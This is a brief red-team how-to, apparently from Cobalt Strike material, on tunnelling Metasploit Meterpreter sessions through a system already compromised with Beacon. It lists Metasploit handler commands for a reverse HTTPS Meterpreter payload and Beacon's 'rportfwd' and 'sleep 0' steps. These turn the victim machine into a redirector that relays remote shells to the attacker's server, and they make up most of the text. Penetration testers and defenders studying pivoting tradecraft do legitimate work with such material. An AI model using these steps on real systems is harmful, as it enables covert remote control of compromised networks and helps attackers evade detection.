# Tunnel Meterpreter through Beacon

#### Use Beacon’s rportfwd command to turn a system, compromised with Beacon, into a [redirector](https://www.cobaltstrike.com/2014/01/14/cloud-based-redirectors-for-distributed-hacking/) for your Meterpreter sessions. The rportfwd command creates a server socket on a compromised system. Any connections to this server socket result in a new connection to a forward host/port. Traffic between the forward host/port and the connection to the compromised system is tunneled through Beacon.

#### To create a Meterpreter handler that rides through a Beacon reverse port forward:

<pre>
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST [IP address of compromised system]
set LPORT 8443
set ExitOnSession False
exploit –j
</pre>

#### These commands create a Meterpreter HTTPS handler, bound to port 8443, that stages and connects to the IP address of our pivot host.
 
#### To create a reverse port forward in Cobalt Strike:

1. Interact with a Beacon on the compromised system you want to pivot through.

2. Use sleep 0 to make the Beacon check-in multiple times each second

3. Type rportfwd 8443 [IP of Metasploit system] 8443 to create a reverse port forward.

#### You now have a server socket, bound on the compromised system, that forwards connections to your Meterpreter handler. If you want to use that Meterpreter handler from Cobalt Strike, create a foreign listener.

#### Optionally, use Cobalt Strike’s [Pivot Listeners](https://www.cobaltstrike.com/help-pivot-listener) feature to create a reverse port forward and a foreign listener in one step.

[POC VIDEO](https://youtu.be/ISbTrnKo0wM)